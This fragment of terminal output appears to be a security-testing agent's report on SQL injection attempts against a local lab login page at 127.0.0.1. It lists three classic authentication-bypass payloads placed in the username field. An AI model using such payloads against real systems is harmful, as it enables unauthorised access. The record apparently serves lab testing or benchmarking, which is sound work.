[32m│[0m                                                                              [32m│[0m
[32m│[0m ### **Test Objective**                                                       [32m│[0m
[32m│[0m Tested SQL injection vulnerabilities on `http://127.0.0.1:32816/admin.php`   [32m│[0m
[32m│[0m using POST requests with SQL injection payloads in the username field.       [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m ### **Payloads Tested**                                                      [32m│[0m
[32m│[0m 1. `username=admin' OR '1'='1&password=test` (Tautology-based injection)     [32m│[0m
[32m│[0m 2. `username=admin'--&password=test` (Comment-based injection)               [32m│[0m
[32m│[0m 3. `username=admin' #&password=test` (Hash comment-based injection)          [32m│[0m
